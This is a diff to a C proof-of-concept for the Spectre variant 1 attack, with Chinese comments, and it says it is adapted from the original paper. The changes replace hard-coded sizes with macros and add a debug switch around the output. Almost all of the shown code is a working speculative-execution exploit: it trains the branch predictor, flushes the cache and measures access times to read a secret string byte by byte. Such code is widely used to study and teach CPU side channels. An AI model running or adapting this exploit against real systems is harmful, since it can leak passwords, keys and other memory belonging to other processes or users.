@@ -7,12 +7,13 @@
 #define PAGE_NUM 256
 #define PAGE_SIZE 4096
 #define TRIES 1000
-
+#define LOOP 29
+#define DEBUG
 
 //受害者
 unsigned int array1_size = 16;
 uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
-uint8_t array2[256 * 512];
+uint8_t array2[PAGE_NUM * PAGE_SIZE];
 
 char* secret ="Spectre Attack by drdh.";
 uint8_t temp = 0; //使编译器不会优化下面的函数
@@ -21,11 +22,11 @@ void victim_function(size_t x)
 {
 	if (x < array1_size)
 	{
-		temp &= array2[array1[x] * 512];
+		temp &= array2[array1[x] * PAGE_SIZE];
 	}
 }
 
-//本函数来自论文Spectre Attacks: Exploiting Speculative Execution
+//本函数修改自论文Spectre Attacks: Exploiting Speculative Execution
 //此阈值可以调整，但是在本机中不可低于40
 
 //malicious_x是目的地址，即将要窃取的地址
@@ -42,22 +43,22 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
-		
+
 	for (tries = TRIES; tries > 0; tries--)
 	{
 		//flush array2[(0-255)*512]
 		for (i = 0; i < 256; i++)
-			_mm_clflush(&array2[i * 512]); //固有的flush指令
+			_mm_clflush(&array2[i * PAGE_SIZE]); //固有的flush指令
 
 		//30 个循环，每进行5次训练(x=training_x)，一次攻击(x=malicious_x)
 		training_x = tries % array1_size;
-		for (j = 29; j >= 0; j--)
+
+		for (j = LOOP; j >= 0; j--)
 		{
 			_mm_clflush(&array1_size);
 			//延迟
 			for (volatile int z = 0; z < 100; z++)
-			{
-			} /* Delay (can also mfence) */
+			;
 
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
 			/* Avoid jumps in case those tip off the branch predictor */
@@ -73,14 +74,13 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		for (i = 0; i < 256; i++)
 		{
 			mix_i = ((i * 167) + 13) & 255;
-			addr = &array2[mix_i * 512];
+			addr = &array2[mix_i * PAGE_SIZE];
 			time1 = __rdtscp(&junk); /* READ TIMER */
 			junk = *addr; /* MEMORY ACCESS TO TIME */
 			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
 		}
-
 
 		/* Locate highest & second-highest results results tallies in j/k */
 		j = k = -1;
@@ -126,16 +126,24 @@ int main(int argc, const char* * argv)
 	printf("Reading %d bytes:\n", len);
 	while (--len >= 0)
 	{
-		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+
 		readMemoryByte(malicious_x++, value, score);
+#ifndef DEBUG
+		printf("%c",value[0]);
+#endif
+
+#ifdef DEBUG
+		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
 		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
 		printf("0x%02X='%c' score=%d ", value[0],
 		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+
 		if (score[1] > 0)
 			printf("(second best: 0x%02X='%c' score=%d)", value[1],
 				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
 				   score[1]);
 		printf("\n");
+#endif
 	}
 
 	return (0);
